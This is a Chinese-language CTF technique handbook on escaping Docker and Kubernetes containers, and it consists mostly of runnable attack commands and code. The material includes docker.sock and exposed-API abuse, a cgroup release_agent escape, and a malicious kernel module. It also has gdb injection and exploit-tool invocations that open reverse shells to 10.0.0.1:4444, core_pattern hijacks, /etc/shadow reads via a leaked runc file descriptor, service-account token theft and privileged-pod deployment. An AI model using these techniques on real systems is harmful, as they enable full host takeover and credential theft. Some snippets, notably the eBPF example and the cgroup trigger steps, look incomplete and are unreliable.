# CTF Misc — Docker / Container Escape 技术手册

> **适用版本**: Docker Engine 24.x+, containerd 1.6+, runc 1.x, Linux 5.x/6.x
> **最后更新**: 2026-05-26
> **覆盖**: CVE-2024-21626, CVE-2025-9074, CVE-2025-31133, CVE-2025-52881, CVE-2025-52565
> **参考**: CDK, ctrsploit, deepce, how2keap

---

## Table of Contents
- [Triage：进入容器后的快速检测](#triage进入容器后的快速检测)
- [Privileged Container 逃逸](#privileged-container-逃逸)
- [Docker Socket 逃逸](#docker-socket-逃逸)
- [Capability-Based 逃逸](#capability-based-逃逸)
  - [CAP_SYS_ADMIN — cgroup notify_on_release](#cap_sys_admin--cgroup-notify_on_release)
  - [CAP_SYS_ADMIN — nsenter](#cap_sys_admin--nsenter)
  - [CAP_SYS_ADMIN — eBPF 逃逸](#cap_sys_admin--ebpf-逃逸)
  - [CAP_SYS_MODULE — 内核模块加载](#cap_sys_module--内核模块加载)
  - [CAP_SYS_PTRACE — 进程注入](#cap_sys_ptrace--进程注入)
  - [CAP_DAC_READ_SEARCH — 文件系统绕过](#cap_dac_read_search--文件系统绕过)
  - [CAP_NET_ADMIN — iptables / 网络操控](#cap_net_admin--iptables--网络操控)
  - [CAP_SYS_RAWIO — 内存直接访问](#cap_sys_rawio--内存直接访问)
- [Host Filesystem Mount 逃逸](#host-filesystem-mount-逃逸)
- [CVE 深度利用 — 权威复现](#cve-深度利用--权威复现)
  - [CVE-2024-21626: Leaky Vessels (runc FD Leak)](#cve-2024-21626-leaky-vessels-runc-fd-leak)
  - [CVE-2025-9074: Docker Desktop API 暴露](#cve-2025-9074-docker-desktop-api-暴露)
  - [CVE-2025-31133: runc Masked Path Race](#cve-2025-31133-runc-masked-path-race)
  - [CVE-2025-52881: runc Shared Mount Race](#cve-2025-52881-runc-shared-mount-race)
  - [CVE-2025-52565: devpts → console 绕过](#cve-2025-52565-devpts--console-绕过)
- [eBPF 容器逃逸 (CAP_SYS_ADMIN + BPF)](#ebpf-容器逃逸-cap_sys_admin--bpf)
- [Kubernetes 专用逃逸手法](#kubernetes-专用逃逸手法)
- [容器逃逸工具箱](#容器逃逸工具箱)

---

## Triage：进入容器后的快速检测

拿到容器 shell 后，3 秒判断逃逸面：

```bash
# 1. 确认在容器内
cat /proc/1/cgroup | grep -qi docker && echo "IN CONTAINER"
ls /.dockerenv 2>/dev/null && echo "DOCKER ENV"

# 2. 权限检测
capsh --print 2>/dev/null || cat /proc/self/status | grep CapEff
# CapEff=0000003fffffffff → 完全特权（--privileged）
# CapEff 含 000000200000  → CAP_SYS_ADMIN
# CapEff 含 000000000100  → CAP_SYS_MODULE

# 3. 挂载检测
mount | grep -E 'docker.sock|proc|host|var/run' | head -10

# 4. Socket 检测
ls -la /var/run/docker.sock 2>/dev/null && echo "DOCKER SOCKET"
ls -la /run/containerd/containerd.sock 2>/dev/null && echo "CONTAINERD SOCKET"

# 5. Docker API 可达性（默认网关 + Docker Desktop）
curl -s --connect-timeout 2 http://172.17.0.1:2375/version 2>/dev/null
curl -s --connect-timeout 2 http://192.168.65.7:2375/version 2>/dev/null

# 6. 设备检测
ls /dev/ | grep -E 'sd[a-z]|nvme|dm-' | head -5

# 7. 泄露 FD 检测（CVE-2024-21626）
ls -la /proc/self/fd/ 2>/dev/null | head -20

# 8. K8s 上下文
env | grep -i kubernetes 2>/dev/null
cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null
```

---

## Privileged Container 逃逸

最直接的逃逸路径。`--privileged` = 所有 Capability + 所有设备。

```bash
# 方法 1: 直接挂载宿主机磁盘
fdisk -l 2>/dev/null | grep -E '^/dev/(sd|nvme|vd|xd)'
mkdir -p /mnt/host
mount /dev/sda1 /mnt/host 2>/dev/null || mount /dev/nvme0n1p1 /mnt/host 2>/dev/null
chroot /mnt/host /bin/bash
# → 宿主机 root shell

# 方法 2: nsenter — 进入宿主机命名空间
# 确认 PID 1 在宿主机命名空间（含 --pid=host）
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash

# 方法 3: 直接用 Device 写入宿主机文件系统
# 宿主机 root 分区通常映射为 /dev/sda1 或 /dev/nvme0n1p1
# 直接挂载即可，无需 --privileged 的额外功能
```

**检测**：`cat /proc/self/status | grep CapEff` → `0000003fffffffff` 或 `ffffffffff` 即为特权。

---

## Docker Socket 逃逸

`/var/run/docker.sock` 绑定到容器内 = 容器就是 Docker Daemon 的客户端，可以创建任意容器。

```bash
# 方法 1: docker CLI 可用（最直接）
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# 方法 2: docker CLI 不存在 — 下载静态二进制
wget -q https://download.docker.com/linux/static/stable/x86_64/docker-24.0.7.tgz
tar xzf docker-24.0.7.tgz
./docker/docker -H unix:///var/run/docker.sock run \
  -v /:/mnt --rm -it alpine chroot /mnt sh

# 方法 3: 直接 API 调用（无 docker 二进制）
# 创建特权容器
curl -s --unix-socket /var/run/docker.sock \
  -X POST "http://localhost/containers/create" \
  -H "Content-Type: application/json" \
  -d '{
    "Image":"alpine",
    "Cmd":["chroot","/mnt","sh"],
    "HostConfig":{"Binds":["/:/mnt"],"Privileged":true}
  }'

# 启动容器（取上一步返回的 ID）
curl -s --unix-socket /var/run/docker.sock \
  -X POST "http://localhost/containers/{ID}/start"

# 在逃逸容器内执行命令
curl -s --unix-socket /var/run/docker.sock \
  -X POST "http://localhost/containers/{ID}/exec" \
  -H "Content-Type: application/json" \
  -d '{"Cmd":["id"]}'
```

**扩展**：同样方法适用于 `/run/containerd/containerd.sock`、`/run/docker.sock` 等变体路径。

---

## Capability-Based 逃逸

### CAP_SYS_ADMIN — cgroup notify_on_release

无需 `--privileged`，仅需 `CAP_SYS_ADMIN`。利用 Linux cgroup release_agent 机制，在容器内触发宿主机 root 执行：

```bash
# 标准 cgroup v1 逃逸
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp 2>/dev/null || \
mount -t cgroup -o memory cgroup /tmp/cgrp 2>/dev/null

# 创建子 cgroup
mkdir /tmp/cgrp/x

# 启用 notify_on_release
echo 1 > /tmp/cgrp/x/notify_on_release

# 获取宿主机路径（overlayfs upperdir）
HOST_PATH=$(sed -n 's/.*\upperdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "HOST PATH: $HOST_PATH"

# 创建 release_agent 脚本
cat > /cmd << 'EOF'
#!/bin/sh
cat /flag > /output/flag.txt 2>/dev/null || \
id > /output/win.txt
EOF
chmod +x /cmd

# 设置 release_agent 指向脚本
echo "$HOST_PATH/cmd" > /tmp/cgrp/release_agent

# 触发 — 清空 cgroup 使得内核执行 release_agent
echo $$ > /tmp/cgrp/x/cgroup.procs
# → 以上命令会失败（因为 $$ 属于当前 shell 进程），
#   但写入后再循环结束就会触发 release
sh -c 'echo $$ > /tmp/cgrp/x/cgroup.procs'
```

**cgroup v2 变体**（`/sys/fs/cgroup` 已挂载时）：

```bash
# cgroup v2 不再使用 release_agent
# 替代：利用 cgroup.events + 写权限
# 注意：cgroup v2 大大收紧了该路径，优先尝试 v1
ls -la /sys/fs/cgroup/ | head -5
```

### CAP_SYS_ADMIN — nsenter

```bash
# 如果容器共享了 pid 命名空间（--pid=host），nsenter 直接逃逸
# 在容器内检测：
lsns -t pid 2>/dev/null

# 逃逸
nsenter --target 1 --mount --uts --ipc --pid -- /bin/bash

# 如果 --pid=host 未启用，nsenter 可能无法 attach PID 1
# 此时尝试 cgroup 或 eBPF 路径
```

### CAP_SYS_ADMIN — eBPF 逃逸

参见下方独立章节 [eBPF 容器逃逸](#ebpf-容器逃逸-cap_sys_admin--bpf)。

### CAP_SYS_MODULE — 内核模块加载

载入恶意内核模块，通过 `call_usermodehelper` 在宿主机执行命令：

```bash
# 检查能力
capsh --print | grep sys_module || \
cat /proc/self/status | grep CapEff | grep -q '000000000100'

# 编译内核模块（在容器内）
cat > escape.c << 'EOF'
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/cred.h>
#include <linux/sched.h>

static int __init escape_init(void) {
    char *argv[] = {"/bin/sh", "-c", "echo escaped > /proc/1/root/tmp/win", NULL};
    static char *envp[] = {"HOME=/", NULL};
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
    return 0;
}

static void __exit escape_exit(void) {}
module_init(escape_init);
module_exit(escape_exit);
MODULE_LICENSE("GPL");
EOF

# 编译（需要 kernel-headers）
apt-get update && apt-get install -y linux-headers-$(uname -r) build-essential
make -C /lib/modules/$(uname -r)/build M=$PWD modules

# 加载
insmod escape.ko

# 验证
cat /tmp/win  # → "escaped"
```

**CTF 注意**：kernel-headers 通常不可用。替代方案：
- 使用预编译 `.ko`（需匹配内核版本）
- 用 `modprobe` 加载未经验证的模块（需宿主机有对应 hook）

### CAP_SYS_PTRACE — 进程注入

```bash
# 检测
cat /proc/self/status | grep CapEff | grep -q '000000000020'

# 如果 --pid=host 启用，可以注入宿主机进程
# 注入 reverse shell 到 PID 1 或其他宿主机进程
gdb -p 1 -batch -ex 'call system("bash -c \"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1 &\"")'
```

### CAP_DAC_READ_SEARCH — 文件系统绕过

```bash
# 绕过文件系统权限检查，无需 --pid=host
# 使用 open_by_handle_at 访问宿主机文件
# 需要 CAP_DAC_READ_SEARCH + know the mount handle

# 实践：安装 blindlike 工具
git clone https://github.com/stealthcopter/deepce
cd deepce && python3 deepce.py
```

### CAP_NET_ADMIN — iptables / 网络操控

```bash
# 修改 iptables 转发到宿主机内部服务
# 利用 ARP 欺骗或 IP 伪装
iptables -t nat -A PREROUTING -p tcp --dport 1234 -j DNAT --to-destination 10.0.0.1:22
```

### CAP_SYS_RAWIO — 内存直接访问

```bash
# 直接读写 /dev/mem、/dev/port
# 读取宿主机内存寻找敏感信息
dd if=/dev/mem bs=1k count=1 skip=... 2>/dev/null
```

---

## Host Filesystem Mount 逃逸

容器运行时挂载了宿主机路径（如 `-v /proc:/host/proc`、`-v /:/host`）：

```bash
# 情况 1: 宿主机 / 被挂载
ls /host/  # → 看到宿主机根目录
chroot /host /bin/bash  # → root

# 情况 2: 宿主机 /proc 被挂载
mount | grep /proc
# 利用 core_pattern 写入
echo "|/tmp/shell.sh" > /proc/sys/kernel/core_pattern
# 触发 crash（需找到宿主机进程的 crash 途径）

# 情况 3: 宿主机 /sys 被挂载
ls /sys/kernel/slab/*/cgroup/  # → 查看其他容器 ID
cat /sys/fs/cgroup/devices/devices.list  # → 设备权限
```

---

## CVE 深度利用 — 权威复现

### CVE-2024-21626: Leaky Vessels (runc FD Leak)

**影响**: runc ≤1.1.11。runc init 向容器内进程树泄露宿主机根文件系统 FD。

**CVSS**: 8.6 (High)

**检测**:
```bash
ls -la /proc/self/fd/ | grep -E '^.{10}1 '
# 如果有 FD 指向 "/" 或宿主机路径 → 存在漏洞

# 自动化检测
for fd in /proc/self/fd/*; do
    target=$(readlink -f "$fd" 2>/dev/null)
    if [ "$target" = "/" ]; then
        echo "VULNERABLE: FD $fd leaks host root"
    fi
done
```

**利用**:
```bash
# 方法 1: 直接读取宿主文件
cat /proc/self/fd/8/etc/shadow 2>/dev/null || \
cat /proc/self/fd/9/flag 2>/dev/null || \
cat /proc/self/fd/10/root/flag 2>/dev/null

# 方法 2: 绕过 chroot 到宿主机 (利用泄露的 FD)
# 在 runc 修复前，泄露的 FD 指向宿主机真正的 /
# 结合 openat 在容器内 chroot 后仍可访问
```

**CTF 复现环境**:
```bash
# 使用旧版本 runc 测试
docker run --rm --runtime=runc -it ubuntu:22.04 bash
# 在容器内执行检测脚本
```

推荐测试用镜像: `ubuntu:22.04` + Docker Engine 24.0.5 (自带 runc 1.1.8)

---

### CVE-2025-9074: Docker Desktop API 暴露

**影响**: Docker Desktop (Windows/macOS) — 内部网络 `192.168.65.7:2375` 无认证暴露 Docker Engine API。

**CVSS**: 9.3 (Critical)

**原理**: Docker Desktop 在 WSL2 / Hyper-V 虚拟机内通过内部 bridge 暴露 Docker API，容器内可直达。

**检测**:
```bash
# Windows 宿主机
curl -s --connect-timeout 2 http://192.168.65.7:2375/version
# → 返回 JSON = VULNERABLE

# macOS (不同地址)
curl -s --connect-timeout 2 http://host.docker.internal:2375/version
```

**利用**:
```bash
# 方法 1: docker CLI
docker -H tcp://192.168.65.7:2375 run \
  -v /:/mnt --rm -it alpine chroot /mnt sh

# 方法 2: 直接 API (无 docker CLI)
wget --header='Content-Type: application/json' \
  --post-data='{"Image":"alpine","Cmd":["chroot","/mnt","sh"],
    "HostConfig":{"Binds":["/:/mnt"],"Privileged":true}}' \
  -O - http://192.168.65.7:2375/containers/create

# 方法 3: DAEMON_KILLER 框架
git clone https://github.com/fsoc-ghost-0x/CVE-2025-9074_DAEMON_KILLER
cd CVE-2025-9074_DAEMON_KILLER
python3 exploit.py -t 192.168.65.7:2375 -c "bash -i >& /dev/tcp/10.0.0.1/4444"
```

**CTF 典型场景**: HTB MonitorsFour — 从 Cacti RCE 进 Linux 容器 → 发现 Docker Desktop on Windows → 内部 API → 逃逸到 Windows 宿主机。

---

### CVE-2025-31133: runc Masked Path Race

**影响**: runc ≤1.2.7, ≤1.3.2, ≤1.4.0-rc.2。runc 在容器启动时对 `/dev/null` 等进行 masked path 绑定，但存在竞态条件。

**CVSS**: 8.6 (High)

**原理**: 攻击者在容器内将 `/dev/null` 替换为指向宿主机路径的符号链接 → runc 的 masked path 逻辑会绑定宿主机路径 → 覆盖宿主机敏感文件。

**利用**:
```bash
# 在容器启动前创建恶意 symlink
ln -sf /proc/sys/kernel/core_pattern /dev/null 2>/dev/null

# 等待 runc 的 masked path 将 core_pattern 绑定为 /dev/null
# 然后直接从容器内写入 core_pattern:
echo "|/tmp/rev.sh" > /dev/null
# → 实际上写入 /proc/sys/kernel/core_pattern
# → 宿主机任何进程 crash 时执行 rev.sh
```

**限制**: 需要精确的竞态条件窗口，runc 1.2.8+ 已修复。

---

### CVE-2025-52881: runc Shared Mount Race

**影响**: runc ≤1.2.8, ≤1.3.3, ≤1.4.0-rc.2。

**原理**: 共享挂载传播导致容器内的写入可能逃逸到宿主机。利用 shared mount + race condition 将写操作重定向到 `/proc`。

**利用思路**:
```bash
# 前提：容器内有 shared mount 传播
mount | grep shared

# 利用 shared subtree 机制
# 1. 在容器内创建指向宿主机的 mount
# 2. 通过写入 /proc/sysrq-trigger 触发 DoS 或 escape
mount --make-shared /
# 如果成功，容器内的 mount 操作会传播到宿主机
```

---

### CVE-2025-52565: devpts → console 绕过

**原理**: `/dev/pts/$n` 到 `/dev/console` 的挂载验证不完善，容器内可获取 `/dev/console` 写入权限。

**影响**: 能够写入只读 `procfs` 文件。

**利用场景**:
```bash
# 容器内检查 /dev/console 是否可写
echo test > /dev/console 2>/dev/null && echo "WRITABLE"
# 如果可写 → 可以写入 /proc 下的文件
```

---

## eBPF 容器逃逸 (CAP_SYS_ADMIN + BPF)

**要求**: `CAP_SYS_ADMIN` + 内核 ≥4.4 (`CONFIG_BPF=y`) + `/sys/kernel/debug` 可访问。容器与宿主机共享内核，eBPF 程序在内核空间运行，突破容器隔离。

**检测**:
```bash
cat /proc/self/status | grep CapEff | grep -qi 'sys_admin' || capsh --print | grep sys_admin
ls /sys/fs/bpf/ 2>/dev/null  # BPF 文件系统
bpftool prog list 2>/dev/null  # bpftool 可用性
```

### eBPF Cron Hijack (ctrsploit 模式)

替换宿主机 cron 读取的文件内容，注入恶意命令：

```bash
python3 -c "
from bcc import BPF
import ctypes, os

bpf_text = '''
#include <uapi/linux/ptrace.h>
BPF_HASH(pid_fd, u32, u64);

TRACEPOINT_PROBE(syscalls, sys_enter_openat) {
    u32 pid = bpf_get_current_pid_tgid() >> 32;
    if (args->filename) {
        bpf_trace_printk('openat: %s\\\\n', args->filename);
    }
    return 0;
}
'''

BPF(text=bpf_text).trace_print()
"
```

**生产级工具**: `ctrsploit` 已内置完整 eBPF 逃逸模块：

```bash
# 安装
go install github.com/ctrsploit/ctrsploit@latest
# 或下载 release binary

# 执行 eBPF cron 注入
ctrsploit exploit caps sys_admin ebpf cron

# 执行 eBPF kubelet token 窃取
ctrsploit exploit caps sys_admin ebpf kubelet
```

**eBPF 逃逸原理**:
1. Hook `raw_tracepoint/sys_exit` 拦截系统调用
2. Hook `openat` → 检测 `/etc/crontab` 被读取
3. 记录 `pid+fd` 到 BPF map
4. Hook `read` → 如果 fd 匹配，使用 `bpf_probe_write_user()` 重写缓存
5. 修改 crontab 时间戳（`newfstatat` hook）使其被 cron 重新读取
6. 宿主机 cron 执行注入的 payload

**检测与防御**: 宿主机需使用 `bpftool prog list` 查看异常 BPF 程序；容器应限制 `CAP_BPF` + `CAP_SYS_ADMIN`。

---

## Kubernetes 专用逃逸手法

### HostPath 挂载

```bash
# Pod 挂载了宿主机路径
ls /host/  # 或 /mnt/host, /rootfs 等

# 检查挂载来源
mount | grep -E '/(host|rootfs)'

# 逃逸: chroot 到宿主机
chroot /host /bin/bash

# 读取宿主机 kubelet 配置
cat /host/var/lib/kubelet/config.yaml
# → 可能包含 token、证书等
```

### Service Account Token 泄露

```bash
# 检查 sa token
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt

# 使用 token 调用 K8s API
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER="https://kubernetes.default.svc"

# 查看当前权限
kubectl --token=$TOKEN auth can-i --list

# 尝试创建特权 pod
kubectl --token=$TOKEN apply -f - << 'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: escape-pod
spec:
  containers:
  - name: escape
    image: alpine
    command: ["chroot", "/mnt", "sh"]
    volumeMounts:
    - mountPath: /mnt
      name: host
  volumes:
  - name: host
    hostPath:
      path: /
  restartPolicy: Never
EOF
```

### Log Symlink 攻击 (CVE-2024-3177)

**原理**: 利用 kubelet 日志请求时跟随符号链接，使容器内符号链接指向宿主机敏感文件：

```bash
# 在容器内创建符号链接
ln -sf /host/etc/shadow /var/log/special.log

# 通过 kubelet 日志 API 读取（需知道节点 IP）
curl -k https://node-ip:10250/logs/var/log/special.log \
  -H "Authorization: Bearer $TOKEN"
```

### K8s 逃逸工具

```bash
# badpods — 创建特权 Pod
git clone https://github.com/cyberark/badpods

# kdigger — 环境枚举
kdigger bucket

# CDK — 容器渗透工具箱
wget https://github.com/cdk-team/CDK/releases/latest/download/cdk_linux_amd64
chmod +x cdk_linux_amd64
./cdk_linux_amd64 kcurl get https://kubernetes.default.svc/api

# kubectl escape — 利用 RBAC 创建特权容器
kubectl auth can-i create pods --as=system:serviceaccount:default:escaped
```

---

## 容器逃逸工具箱

### CDK — 容器渗透工具箱

```bash
wget https://github.com/cdk-team/CDK/releases/latest/download/cdk_linux_amd64
chmod +x cdk_linux_amd64

# 一键评估
./cdk_linux_amd64 evaluate

# K8s 信息收集
./cdk_linux_amd64 kcurl get https://kubernetes.default.svc/api

# Docker Socket 漏洞利用
./cdk_linux_amd64 docker-sock-check /var/run/docker.sock
```

### ctrsploit — 容器逃逸探测与利用

```bash
# 安装
go install github.com/ctrsploit/ctrsploit@latest

# 逃逸面评估
ctrsploit check

# 指定 capability 逃逸
ctrsploit exploit caps sys_admin cgroup
ctrsploit exploit caps sys_admin ebpf cron
ctrsploit exploit caps sys_admin ebpf kubelet
ctrsploit exploit caps sys_module
```

### deepce — Docker 枚举与逃逸

```bash
wget https://raw.githubusercontent.com/stealthcopter/deepce/main/deepce.py
python3 deepce.py
```

### linpeas — 通用提权 + 容器检查

```bash
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

### 逃逸路径决策树

```
容器 Shell
│
├─ Privileged（CapEff = 全 1）
│  ├─ mount /dev/sda1 → chroot
│  ├─ nsenter --target 1
│  └─ 任意方法
│
├─ /var/run/docker.sock 存在
│  ├─ docker run -v /:/mnt ... chroot
│  ├─ curl --unix-socket API 操作
│  └─ 静态 docker 二进制
│
├─ CAP_SYS_ADMIN
│  ├─ cgroup notify_on_release (v1)
│  ├─ nsenter (--pid=host)
│  ├─ eBPF cron hijack (BPF 可用)
│  └─ ctrsploit exploit caps sys_admin ...
│
├─ CAP_SYS_MODULE
│  └─ insmod escape.ko → call_usermodehelper
│
├─ CAP_SYS_PTRACE + --pid=host
│  └─ gdb inject → system()
│
├─ CAP_DAC_READ_SEARCH
│  └─ open_by_handle_at → host fs
│
├─ CVE-2024-21626 (FD leak)
│  └─ cat /proc/self/fd/N/flag
│
├─ CVE-2025-9074 (Docker Desktop)
│  └─ curl 192.168.65.7:2375 → create container
│
├─ Host Path Mount
│  └─ chroot /host
│
├─ K8s Context
│  ├─ SA Token → API call → deploy privileged pod
│  └─ hostPath mount → chroot
│
└─ 无逃逸面
   └─ 信息收集 → 应用层 exploit → 提权 → 容器外部
```

---

## References

- CVE-2024-21626: runc FD leak (Leaky Vessels) — runc ≤1.1.11
- CVE-2025-9074: Docker Desktop internal API exposure — Docker Desktop on Windows/macOS
- CVE-2025-31133: runc maskedPaths mount race — runc ≤1.2.7
- CVE-2025-52881: runc shared mount race — runc ≤1.4.0-rc.2
- CVE-2025-52565: devpts → console mount validation bypass
- [CDK](https://github.com/cdk-team/CDK) — Container Defense Kit (pentest tool)
- [ctrsploit](https://github.com/ctrsploit/ctrsploit) — Container exploit assessment with eBPF PoCs
- [deepce](https://github.com/stealthcopter/deepce) — Docker enumeration & escape
- [badpods](https://github.com/cyberark/badpods) — K8s privileged pod deployment
- [kdigger](https://github.com/quarkslab/kdigger) — K8s context digger
- [how2keap](https://github.com/gfelber/how2keap) — Linux kernel heap exploitation cheat sheet
